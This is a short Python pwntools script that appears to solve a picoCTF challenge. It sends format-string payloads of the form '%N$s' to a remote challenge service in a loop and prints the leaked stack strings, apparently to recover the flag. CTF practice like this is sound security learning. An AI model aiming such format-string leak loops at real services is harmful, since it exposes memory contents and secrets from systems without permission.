#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 52660
HOST = "saturn.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x80493a4
            c
            set follow-fork-mode parent
            ''')

# if len(sys.argv) > 1 and sys.argv[1] == 'r':
#     p = remote(HOST, PORT)
# else:
#     p = exe.process()

for i in range(10, 40):
    p = remote(HOST, PORT)
    fmt = f"%{i}$s"
    p.sendlineafter(b">> ", fmt)
    p.recvuntil(b"Here's a story - \n")
    try:
        leak = p.recvline(timeout=1)
        print(i, leak)
    except:
        try:
            p.close()
        except:
            pass

p.interactive()